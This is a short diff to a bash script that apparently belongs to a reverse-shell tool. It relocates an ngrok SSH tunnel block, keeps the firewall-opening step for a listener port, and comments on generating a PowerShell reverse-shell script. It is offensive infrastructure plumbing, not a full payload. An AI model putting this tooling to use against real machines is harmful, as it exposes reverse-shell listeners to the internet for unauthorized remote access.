@@ -338,6 +338,15 @@ fi
 # Setup trap
 trap cleanup SIGINT
 
+if [[ -n $ngrok ]]; then
+    # ngrok doesn't need firewall for HTTP(S)
+    url="$(
+        ssh -f -o "ControlMaster no" -o "IdentitiesOnly yes" \
+        -R 0:localhost:"$port" tunnel.us.ngrok.com http | \
+        grep -im 1 -oPs "forwarding\s+\Khttps.+"
+    )"
+fi
+
 # Create reverse shell powershell script
 chmod +x scripts/reverse_powershell # Ensure executable
 mkdir -p "$(dirname "$rshell_ps1")"
@@ -371,14 +380,7 @@ function prompt {
 }
 EOF
 
-if [[ -n $ngrok ]]; then
-    # ngrok doesn't need firewall for HTTP(S)
-    url="$(
-        ssh -f -o "ControlMaster no" -o "IdentitiesOnly yes" \
-        -R 0:localhost:"$port" tunnel.us.ngrok.com http | \
-        grep -im 1 -oPs "forwarding\s+\Khttps.+"
-    )"
-else
+if [[ -z $ngrok ]]; then
     # Open firewall for HTTP(S)
     subinfo "Opening $port on $ip interface (using sudo)"
     sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
